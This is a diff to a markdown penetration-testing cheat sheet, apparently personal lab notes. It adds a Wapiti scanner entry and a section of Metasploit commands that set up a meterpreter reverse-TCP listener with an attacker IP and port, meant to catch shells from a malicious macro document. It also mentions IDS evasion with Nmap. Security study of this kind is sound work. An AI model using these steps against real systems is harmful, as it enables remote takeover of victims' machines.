@@ -69,6 +69,10 @@ Scan to avoid IDS
 
 `--reason` if you want Nmap to provide more details regarding its reasoning and conclusions
 
+### Wapiti
+
+audit the security of your web applications. It performs “black-box” scan 
+https://salsa.debian.org/pkg-security-team/wapiti
 
 ### ZAP
 
@@ -530,6 +534,19 @@ Metasploit has several payloads under “cmd/unix” that can be used to generat
 ```shell
 msfvenom -l payloads | grep "cmd/unix"
 ```
+
+
+### MSF Listener
+
+- Open a new terminal window and run `msfconsole` to start the Metasploit Framework
+- `use multi/handler` to handle incoming connections
+- `set payload windows/meterpreter/reverse_tcp` to ensure that our payload works with the payload used when creating the malicious macro  
+- `set LHOST 10.10.170.181` specifies the IP address of the attacker’s system and should be the same as the one used when creating the document
+- `set LPORT 8888` specifies the port number you are going to listen on and should be the same as the one used when creating the document
+- `show options` to confirm the values of your options
+- `exploit` starts listening for incoming connections to establish a reverse shell
+
+
 
 ---
 
